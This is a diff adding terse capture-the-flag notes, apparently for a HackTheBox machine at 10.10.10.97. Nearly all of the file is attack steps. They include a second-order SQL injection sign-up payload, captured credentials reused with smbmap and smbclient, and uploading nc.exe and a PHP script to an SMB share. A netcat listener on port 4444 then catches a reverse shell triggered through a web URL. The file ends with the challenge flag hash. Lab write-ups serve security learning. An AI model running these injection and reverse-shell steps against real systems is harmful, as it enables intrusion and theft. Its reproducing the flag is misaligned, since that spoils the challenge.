@@ -1,0 +1,38 @@
+#10.10.10.97
+#PORT- 80, 445(smb, microsoft-ds), 8808
+
+#nmap
+#dirb - nothing
+
+#there is second order sql injection
+#sign up as:   'or 1=1-- -
+#user and passwd found
+#USER= tyler
+#PASSWD= 92g!mA8BGjOirkL%OG*&
+
+#smb enumeration tool
+smbmap -u tyler -p 92g!mA8BGjOirkL%OG*& -H 10.10.10.97
+#so there is a share called 'new-site'
+#connect to smbclient
+smbclient //secnotes.htb/new-site -U tyler
+		OR
+smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' \\\\10.10.10.97\\new-site
+
+--------------------------------------------------------------------------
+#INSIDE SMBCLIENT
+--------------------------------------------------------------------------
+#upload nc.exe 
+#upload php script
+#check p.php file
+#listen on port 
+nc -nvlp 4444
+#execute p.php file by visiting the url: 
+http://10.10.10.97:8808/p.php
+
+#user.txt file inside c:/Users/tyler/Desktop
+
+
+#key
+6fa7556968052a83183fb8099cb904f3
+
+
